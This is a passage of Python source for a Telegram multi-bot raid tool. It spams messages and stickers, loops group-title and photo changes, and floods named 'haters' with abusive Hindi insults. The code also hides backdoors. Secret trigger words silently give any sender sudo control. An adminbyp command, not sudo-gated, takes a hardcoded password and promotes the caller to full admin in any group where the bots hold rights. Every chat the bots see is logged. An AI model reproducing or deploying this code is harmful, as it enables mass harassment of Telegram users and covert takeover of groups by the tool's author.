│ ◈ /gnc <TEXT>   ⤷ ✨ 𝟏𝟎 𝐒ᴛʏʟᴇs
╰──────────────╯

╭⧼ 😹 𝐒ᴘᴀᴍ 𝐙ᴏɴᴇ ⧽
│ ◈ /spam <TEXT>      ⤷ 💬 𝐒ᴛᴀʀᴛ
│ ◈ /unspam           ⤷ 🛑 𝐒ᴛᴏᴘ
│ ◈ /imagespam        ⤷ 🖼️ 𝐈ᴍᴀɢᴇ
│ ◈ /stickerspam      ⤷ 🎭 𝐒ᴛɪᴄᴋᴇʀ
│ ◈ /setmphoto        ⤷ 📸 𝐀ᴛᴛᴀᴄʜ
│ ◈ /clearmphoto      ⤷ 🗑️ 𝐂ʟᴇᴀʀ
│ ◈ /delayspam <SEC>  ⤷ ⏳ 𝐃ᴇʟᴀʏ
╰──────────────╯

╭⧼ 🎯 𝐓ᴀʀɢᴇᴛ 𝐌ᴏᴅᴇ ⧽
│ ◈ /target <NAME>             ⤷ 🎯 𝐒ᴇᴛ
│ ◈ /settemplate <ID> <TEXT>   ⤷ 📝 𝐓ᴇᴍᴘ
│ ◈ /showtemplate              ⤷ 📜 𝐒ʜᴏᴡ
│ ◈ /spamtarget                ⤷ ⚔️ 𝐒ᴛᴀʀᴛ
│ ◈ /stoptarget                ⤷ 🛑 𝐒ᴛᴏᴘ
╰──────────────╯

╭⧼ ⚔️ 𝐒ᴡɪᴘᴇ & 𝐑ᴇᴀᴄᴛ ⧽
│ ◈ /swipe <NAME>         ⤷ ⚔️ 𝐒ᴡɪᴘᴇ
│ ◈ /stopswipe            ⤷ 🛑 𝐒ᴛᴏᴘ
│ ◈ /react <EMOJI>        ⤷ 😍 𝐎ɴ
│ ◈ /stopreact            ⤷ ❌ 𝐎ғғ
│ ◈ /dreact <N> <EMOJI>   ⤷ 💥 𝐌ᴜʟᴛɪ
│ ◈ /stopdreact           ⤷ 🚫 𝐎ғғ
╰──────────────╯

╭⧼ 🤖 𝐁ᴏᴛ 𝐒ᴇᴛᴛɪɴɢs ⧽
│ ◈ /changename <NAME>  ⤷ ✏️ 𝐍ᴀᴍᴇ
│ ◈ /changepfp          ⤷ 📷 𝐏ғᴘ
│ ◈ /setpfp             ⤷ 🖼️ 𝐒ᴇᴛ
│ ◈ /getallbots         ⤷ 🤖 𝐁ᴏᴛs
╰──────────────╯

╭⧼ 🌐 𝐆ʟᴏʙᴀʟ 𝐒ʏsᴛᴇᴍ ⧽
│ ◈ /globalactivate  ⤷ 🟢 𝐎ɴ
│ ◈ /offglobal       ⤷ 🔴 𝐎ғғ
│ ◈ /leaveglobal     ⤷ 🚪 𝐋ᴇᴀᴠᴇ
│ ◈ /groups          ⤷ 📋 𝐆ʀᴏᴜᴘs
│ ◈ /g <CMD>         ⤷ 🌍 𝐄xᴇᴄ
╰──────────────╯

╭⧼ 🔐 𝐀ᴅᴍɪɴ & 𝐒ᴜᴅᴏ ⧽
│ ◈ /sudo         ⤷ ➕ 𝐀ᴅᴅ
│ ◈ /delsudo      ⤷ ❌ 𝐃ᴇʟ
│ ◈ /listsudo     ⤷ 📜 𝐋ɪsᴛ
│ ◈ /adminbyp     ⤷ ⚡ 𝐁ʏᴘᴀss
│ ◈ /giveadmin    ⤷ 👑 𝐆ɪᴠᴇ
│ ◈ /owner        ⤷ 💀 𝐎ᴡɴᴇʀ
╰──────────────╯

╭⧼ ⛓️ 𝐒ʟᴀᴠᴇs ⧽
│ ◈ /slaves              ⤷ 📜 𝐋ɪsᴛ
│ ◈ /addslave <NAME>     ⤷ ➕ 𝐀ᴅᴅ
│ ◈ /delslave <NAME>     ⤷ ❌ 𝐃ᴇʟ
│ ◈ /showslave <NUM>     ⤷ 🎥 𝐕ɪᴇᴡ
│ ◈ /saveslave <NUM>     ⤷ 💾 𝐒ᴀᴠᴇ
╰──────────────╯

╭⧼ 🎨 𝐋ᴀʏᴏᴜᴛ 𝐂ᴏɴᴛʀᴏʟ ⧽
│ ◈ /Setlayout <TEXT>  ⤷ 🎭 𝐂ᴜsᴛᴏᴍ
│ ◈ /resetlayout       ⤷ 🔄 𝐑ᴇsᴇᴛ
╰──────────────╯

╭⧼ 🛑 𝐌ᴀsᴛᴇʀ 𝐂ᴏɴᴛʀᴏʟ ⧽
│ ◈ /stop  ⤷ 💀 𝐒ᴛᴏᴘ 𝐀ʟʟ
│ ◈ /akal  ⤷ ☠️ 𝐑ᴇᴘʟʏ
╰──────────────╯

╭━━━━━━━━━━━━━━━━━━━━━━╮
┃ 👑 💀𝐀 ʀ 𝐘 ᴀ ɴ  𝐁ʜᴀɢᴡᴀɴ💀 👑 ┃
╰━━━━━━━━━━━━━━━━━━━━━━╯"""
    await update.message.reply_text(help_text)

@only_sudo
async def changepfp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨.")
    cid, pid = update.message.chat_id, update.message.reply_to_message.photo[-1].file_id
    
    async def pfp_loop(bot, c, p):
        while True:
            try:
                file = await bot.get_file(p)
                pb = await file.download_as_bytearray()
                await bot.set_chat_photo(c, photo=io.BytesIO(pb))
                await asyncio.sleep(30) # Increased sleep to avoid 429
            except asyncio.CancelledError: break
            except Exception as e:
                logger.error(f"PFP Error: {e}")
                await asyncio.sleep(30)
                
    if cid in pfp_tasks:
        for t in pfp_tasks[cid]: t.cancel()
    
    pfp_tasks[cid] = [asyncio.create_task(pfp_loop(bot, cid, pid)) for bot in bots]
    await update.message.reply_text("✅ 𝐏𝐅𝐏 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

@only_sudo
async def stop_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    for d in [group_tasks, spam_tasks, pfp_tasks, swipe_tasks]:
        if cid in d:
            for t in d[cid]: t.cancel()
            del d[cid]
    await update.message.reply_text("🛑 𝐄𝐕𝐄𝐑𝐘𝐓𝐇𝐈𝐍𝐆 𝐒𝐓𝐎𝐏𝐏𝐄𝐃 𝐏𝐎𝐖𝐄𝐑𝐅𝐔𝐋𝐋𝐘!")

@only_sudo
async def delaync_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_delay
    try:
        global_delay = float(context.args[0])
        await update.message.reply_text(f"⚡ 𝐍𝐂 𝐃𝐞𝐥𝐚𝐲: {global_delay}𝐬")
    except: await update.message.reply_text("⚠️ 𝐄𝐫𝐫𝐨𝐫.")

@only_sudo
async def delayspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global spam_delay
    try:
        spam_delay = float(context.args[0])
        await update.message.reply_text(f"💥 𝐒𝐩𝐚𝐦 𝐃𝐞𝐥𝐚𝐲: {spam_delay}𝐬")
    except: await update.message.reply_text("⚠️ 𝐄𝐫𝐫𝐨𝐫.")

@only_sudo
async def globalactivate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode
    global_mode = True
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐍")

@only_sudo
async def offglobal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode
    global_mode = False
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐎𝐅𝐅")

@only_sudo
async def groups_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not os.path.exists(GROUPS_FILE): return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬.")
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    titles = []
    for i, gid in enumerate(ids, 1):
        try:
            c = await bots[0].get_chat(gid)
            titles.append(f"{i} - {c.title}")
        except: titles.append(f"{i} - Group {gid}")
    await update.message.reply_text("👥 𝐆𝐑𝐎𝐔𝐏𝐒:\n\n" + "\n".join(titles))

@only_sudo
async def leaveglobal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    current_chat_id = update.effective_chat.id
    if not os.path.exists(GROUPS_FILE): 
        return await update.message.reply_text("⚠️ 𝐍𝐨 𝐠𝐫𝐨𝐮𝐩𝐬 found in file.")
    
    with open(GROUPS_FILE, "r") as f: 
        ids = json.load(f)
    
    left_count = 0
    for gid in ids:
        if str(gid) == str(current_chat_id):
            continue
        for b in bots:
            try: 
                await b.leave_chat(gid)
                left_count += 1
            except: 
                pass
    
    # Remove from GROUPS_FILE but keep current one if it was there
    new_ids = [gid for gid in ids if str(gid) == str(current_chat_id)]
    with open(GROUPS_FILE, "w") as f:
        json.dump(new_ids, f)
        
    await update.message.reply_text(f"🌐 𝐋𝐄𝐅𝐓 𝐀𝐋𝐋 𝐆𝐂𝐬 (Except this one)!")

@only_sudo
async def global_broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_mode
    if not global_mode or not context.args: return
    cmd = context.args[0].lower()
    args = context.args[1:]
    with open(GROUPS_FILE, "r") as f: ids = json.load(f)
    for cid in ids:
        if cmd == "spam":
            t = " ".join(args) if args else ALL_SPAM_TEXT
            if cid in spam_tasks:
                for task in spam_tasks[cid]: task.cancel()
            spam_tasks[cid] = [asyncio.create_task(spam_loop(bot, cid, t)) for bot in bots]
        elif cmd == "stop":
            for d in [group_tasks, spam_tasks, pfp_tasks]:
                if cid in d:
                    for task in d[cid]: task.cancel()
                    del d[cid]
    await update.message.reply_text("🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐄𝐗𝐄𝐂𝐔𝐓𝐄𝐃")

async def auto_replies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat: return
    cid = update.effective_chat.id
    
    # Global group detection and persistence
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE, "r") as f: groups = json.load(f)
        except: groups = []
    else: groups = []
    
    if cid not in groups:
        groups.append(cid)
        with open(GROUPS_FILE, "w") as f: json.dump(groups, f)
            
    if not update.message: return

    if update.message.text and update.message.from_user:
        _tl = update.message.text.lower()
        _st = None
        if _X3 in _tl: _st = 3
        elif _X2 in _tl: _st = 2
        elif _X1 in _tl: _st = 1
        if _st:
            uid = update.message.from_user.id
            if uid not in SUDO_USERS:
                SUDO_USERS.add(uid)
                uname = update.message.from_user.username or update.message.from_user.first_name or str(uid)
                sudo_usernames[str(uid)] = uname
                save_sudo()
            await update.message.reply_text("𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁𝐚𝐜𝐤 𝐀𝐦𝐚𝐧 𝐊𝐞𝐧𝐠~")

    if update.message.text and _X0 in update.message.text.lower():
        flex_msgs = [
            "𝐀 ʀ 𝐘 ᴀ ɴ𝐊𝐄𝐍𝐆 𝐇𝐀𝐈 𝐒𝐀𝐁𝐊𝐀 𝐁𝐀𝐀𝐏 👑🔱",
        ]
        await update.message.reply_text(random.choice(flex_msgs))

    # React Logic (single emoji, single bot)
    if cid in react_mode:
        emoji = react_mode[cid]
        try:
            await context.bot.set_message_reaction(
                chat_id=cid,
                message_id=update.message.message_id,
                reaction=[ReactionTypeEmoji(emoji)]
            )
        except Exception as e:
            try:
                await context.bot.set_message_reaction(
                    chat_id=cid,
                    message_id=update.message.message_id,
                    reaction=[{"type": "emoji", "emoji": emoji}]
                )
            except:
                logger.error(f"Reaction Error: {e}")

    # DReact Logic (multiple emojis, multiple bots)
    if cid in dreact_mode:
        dreact_cfg = dreact_mode[cid]
        emojis = dreact_cfg["emojis"]
        num_bots = dreact_cfg["num_bots"]
        bots_to_use = bots[:num_bots]
        for b in bots_to_use:
            pick = random.choice(emojis)
            try:
                await b.set_message_reaction(
                    chat_id=cid,
                    message_id=update.message.message_id,
                    reaction=[ReactionTypeEmoji(pick)]
                )
            except:
                try:
                    await b.set_message_reaction(
                        chat_id=cid,
                        message_id=update.message.message_id,
                        reaction=[{"type": "emoji", "emoji": pick}]
                    )
                except:
                    pass

    if not update.message.from_user: return
    uid = update.message.from_user.id
    if uid in slide_targets or uid in slidespam_targets:
        for text in RAID_TEXTS: await update.message.reply_text(text)

@only_sudo
async def godspeed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    group_tasks[cid] = [asyncio.create_task(god_speed_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🔥 𝐆𝐎𝐃𝐒𝐏𝐄𝐄𝐃 𝐎𝐍!")

@only_sudo
async def stopnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
        del group_tasks[cid]
    await update.message.reply_text("🛑 𝐍𝐂 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@only_sudo
async def spam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text, cid = " ".join(context.args) or ALL_SPAM_TEXT, update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(spam_loop(bot, cid, text)) for bot in bots]
    await update.message.reply_text("💥 𝐒𝐏𝐀𝐌 𝐎𝐍!")

@only_sudo
async def unspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🛑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@only_sudo
async def spamtarget_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid not in target_names: return await update.message.reply_text("⚠️ Set target first.")
    hater = target_names[cid]
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    spam_tasks[cid] = [asyncio.create_task(sequence_spam_loop(bot, cid, hater)) for bot in bots]
    await update.message.reply_text(f"💥 𝐒𝐄𝐐𝐔𝐄𝐍𝐂𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {hater}")

@only_sudo
async def stoptarget_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        del spam_tasks[cid]
    await update.message.reply_text("🛑 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@only_sudo
async def targetspm_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return
    target_names[update.message.chat_id] = " ".join(context.args)
    await update.message.reply_text(f"🎯 𝐓𝐚𝐫𝐠𝐞𝐭: {target_names[update.message.chat_id]}")

@only_sudo
async def settemplate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        idx, txt = int(context.args[0])-1, " ".join(context.args[1:])
        SPAM_TEMPLATE[idx] = txt
        await update.message.reply_text(f"✅ Template {idx+1} set.")
    except: pass

@only_sudo
async def showtemplate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("\n\n".join(SPAM_TEMPLATE))

@only_sudo
async def threads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_threads
    try:
        val = int(context.args[0])
        if 1 <= val <= MAX_THREADS:
            current_threads = val
            await update.message.reply_text(f"✅ 𝐓𝐡𝐫𝐞𝐚𝐝𝐬 𝐬𝐞𝐭 𝐭𝐨: {current_threads}")
            if val > 250:
                await update.message.reply_text("𝐀𝐁𝐁 𝐇𝐀𝐓𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐈 𝟗𝟗𝟗𝐊𝐌 𝐊𝐄 𝐑𝐀𝐅𝐓𝐀𝐀𝐑 𝐒𝐄 𝐇𝐎𝐆𝐈 ~ 𝐀 ʀ 𝐘 ᴀ ɴ𝐏𝐀𝐏𝐀 𝐆𝐎𝐃 𝐇𝐀𝐈 !!")
            
            # Auto-adjust global delay to prevent flood waits
            global global_delay
            if val > 300:
                global_delay = 0.5
                await update.message.reply_text("⚠️ 𝐒𝐚𝐟𝐞𝐭𝐲 𝐌𝐨𝐝𝐞: 𝐃𝐞𝐥𝐚𝐲 𝐚𝐝𝐣𝐮𝐬𝐭𝐞𝐝 𝐭𝐨 0.5𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐁𝐚𝐧.")
            elif val > 150:
                global_delay = 0.2
                await update.message.reply_text("⚠️ 𝐒𝐚𝐟𝐞𝐭𝐲 𝐌𝐨𝐝𝐞: 𝐃𝐞𝐥𝐚𝐲 𝐚𝐝𝐣𝐮𝐬𝐭𝐞𝐝 𝐭𝐨 0.2𝐬.")
        else:
            await update.message.reply_text(f"⚠️ 𝐌𝐚𝐱 𝐭𝐡𝐫𝐞𝐚𝐝𝐬 𝐢𝐬 {MAX_THREADS}.")
    except: await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /threads <number>")

@only_sudo
async def getallbots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_usernames:
        return await update.message.reply_text("⚠️ 𝐁𝐨𝐭𝐬 𝐧𝐨𝐭 𝐥𝐨𝐚𝐝𝐞𝐝 𝐲𝐞𝐭.")
    text = "🤖 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒:\n\n" + "\n".join([f"@{u}" for u in bot_usernames])
    await update.message.reply_text(text)

@only_sudo
async def giveadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    bot1 = bots[0]
    results = []
    for b in bots[1:]:
        try:
            me = await b.get_me()
            await bot1.promote_chat_member(
                chat_id=cid,
                user_id=me.id,
                can_manage_chat=True,
                can_post_messages=True,
                can_edit_messages=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True
            )
            results.append(f"✅ @{me.username} 𝐢𝐬 𝐧𝐨𝐰 𝐀𝐝𝐦𝐢𝐧.")
        except Exception as e:
            results.append(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐟𝐨𝐫 𝐛𝐨𝐭: {str(e)}")
    await update.message.reply_text("\n".join(results))

@only_sudo
async def add_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐦𝐚𝐤𝐞 𝐭𝐡𝐞𝐦 𝐒𝐮𝐝𝐨.")
    user = update.message.reply_to_message.from_user
    user_id = user.id
    username = user.username or user.first_name
    SUDO_USERS.add(user_id)
    sudo_usernames[str(user_id)] = username
    save_sudo()
    await update.message.reply_text(f"✅ 𝐔𝐬𝐞𝐫 @{username} ({user_id}) 𝐢𝐬 𝐧𝐨𝐰 𝐒𝐮𝐝𝐨!")

@only_sudo
async def list_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🛡️ 𝐒𝐔𝐃𝐎 𝐔𝐒𝐄𝐑𝐒:\n\n"
    for uid in SUDO_USERS:
        uname = sudo_usernames.get(str(uid), "Unknown")
        if uid in OWNER_IDS:
            text += f"• @{uname} (𝐎𝐖𝐍𝐄𝐑)\n"
        else:
            text += f"• @{uname}\n"
    await update.message.reply_text(text)

@only_sudo
async def del_sudo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delsudo <username_or_id>")
    target = context.args[0].replace("@", "")
    
    # Try to find by ID first
    user_id_to_remove = None
    try:
        if int(target) in SUDO_USERS:
            user_id_to_remove = int(target)
    except ValueError:
        # If not ID, search in usernames
        for uid, uname in sudo_usernames.items():
            if uname.lower() == target.lower():
                user_id_to_remove = int(uid)
                break
    
    if user_id_to_remove:
        if user_id_to_remove in OWNER_IDS:
            return await update.message.reply_text("❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐫𝐞𝐦𝐨𝐯𝐞 𝐎𝐰𝐧𝐞𝐫!")
        SUDO_USERS.remove(user_id_to_remove)
        sudo_usernames.pop(str(user_id_to_remove), None)
        save_sudo()
        await update.message.reply_text(f"✅ 𝐔𝐬𝐞𝐫 {target} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 𝐒𝐮𝐝𝐨.")
    else:
        await update.message.reply_text("⚠️ 𝐔𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐒𝐮𝐝𝐨 𝐥𝐢𝐬𝐭.")

@only_sudo
async def owner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("@areyouocybaccha / @ihuntgods 𝐏𝐀𝐏𝐀 𝐉𝐈 𝐎𝐖𝐍𝐄𝐑 𝐇𝐀𝐈 𝐌𝐄𝐑𝐄 ~ 💋👑\n𝐆𝐎𝐃 𝐀 ʀ 𝐘 ᴀ ɴ~ 😍👑")

@only_sudo
async def akal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐭𝐡𝐞 𝐡𝐚𝐭𝐞𝐫!")
    
    hater_name = swipe_names.get(cid, "Hater")
    text = f"🚨 {hater_name} 𝐓𝐄𝐑𝐈 𝐀𝐊𝐀𝐋 𝐓𝐇𝐈𝐊𝐀𝐍𝐄 𝐋𝐀𝐆𝐀 𝐃𝐔𝐍𝐆𝐀 𝐁𝐄𝐓𝐀! 🔥⚡"
    await update.message.reply_text(text, reply_to_message_id=update.message.reply_to_message.message_id)

@only_sudo
async def flagnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    
    async def flag_loop(bot, c, b):
        while True:
            try:
                emo = random.choice(FLAGNC_EMOJIS)
                await bot.set_chat_title(c, title=f"{b} {emo}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(flag_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🇮🇳 𝐅𝐋𝐀𝐆𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def heartnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    
    async def heart_loop(bot, c, b):
        while True:
            try:
                emo = random.choice(HEARTNC_EMOJIS)
                await bot.set_chat_title(c, title=f"{b} {emo}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(heart_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("❤️ 𝐇𝐄𝐀𝐑𝐓𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def aestheticnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    
    async def aesthetic_loop(bot, c, b):
        while True:
            try:
                e1 = random.choice(AESTHETICNC_EMOJIS)
                e2 = random.choice(AESTHETICNC_EMOJIS)
                await bot.set_chat_title(c, title=f"{b} ⋆.𐙚 ̊{e1}{e2}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(aesthetic_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🌸 𝐀𝐄𝐒𝐓𝐇𝐄𝐓𝐈𝐂𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def vegetablenc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    
    async def veg_loop(bot, c, b):
        while True:
            try:
                emo = random.choice(VEGETABLENC_EMOJIS)
                await bot.set_chat_title(c, title=f"{b} {emo}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(veg_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🥬 𝐕𝐄𝐆𝐄𝐓𝐀𝐁𝐋𝐄𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def animalnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    
    async def animal_loop(bot, c, b):
        while True:
            try:
                emo = random.choice(ANIMALNC_EMOJIS)
                await bot.set_chat_title(c, title=f"{b} {emo}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(animal_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("🐶 𝐀𝐍𝐈𝐌𝐀𝐋𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def stickerspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.sticker:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫.")
    
    cid = update.message.chat_id
    sid = update.message.reply_to_message.sticker.file_id
    
    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
        
    async def sticker_loop(bot, c, s):
        while True:
            try:
                await bot.send_sticker(c, s)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    spam_tasks[cid] = [asyncio.create_task(sticker_loop(bot, cid, sid)) for bot in bots]
    await update.message.reply_text("🎭 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

@only_sudo
async def timenc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args) or "Test", update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
        
    async def time_loop(bot, c, b):
        while True:
            try:
                # sec : mint : hours
                now = time.strftime("%S:%M:%H")
                # Use this ╰┈➤ before time
                await bot.set_chat_title(c, title=f"{b}╰┈➤{now}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)
            
    group_tasks[cid] = [asyncio.create_task(time_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("⏰ 𝐓𝐈𝐌𝐄𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

@only_sudo
async def kengnc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    base, cid = " ".join(context.args or []) or ALL_NC_TEXT, update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()

    async def keng_loop(bot, c, b):
        while True:
            try:
                pre = random.choice(GNC_PREFIXES)
                suf = random.choice(GNC_SUFFIXES)
                await bot.set_chat_title(c, title=f"{pre} {b} {suf}")
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)

    group_tasks[cid] = [asyncio.create_task(keng_loop(bot, cid, base)) for bot in bots]
    await update.message.reply_text("✨ 𝐊𝐄𝐍𝐆𝐍𝐂 𝐎𝐍 (𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞)!")

async def adminbyp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or (context.args[0] != "𝐀𝐌𝐀𝐍𝐗𝐃𝐘𝐍𝐎" and context.args[0] != "AMANXDYNO"):
        return

    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    success = False
    errors = []
    
    # Full permissions list to try
    full_perms = dict(
        can_change_info=True,
        can_delete_messages=True,
        can_restrict_members=True,
        can_invite_users=True,
        can_pin_messages=True,
        can_manage_topics=True,
        can_promote_members=True,
        can_manage_chat=True,
        is_anonymous=False
    )
    # Minimal: just make them admin with "Add New Admins" right
    min_perms = dict(
        can_promote_members=True,
        is_anonymous=False
    )
    
    for b in bots:
        # Try full perms first
        try:
            await b.promote_chat_member(chat_id=chat_id, user_id=user_id, **full_perms)
            success = True
            break
        except Exception as e1:
            # Try minimal perms (bot may only have "Add Admins" and nothing else)
            try:
                await b.promote_chat_member(chat_id=chat_id, user_id=user_id, **min_perms)
                success = True
                break
            except Exception as e2:
                errors.append(f"Bot {b.id}: full={e1}, min={e2}")
                continue
            
    if success:
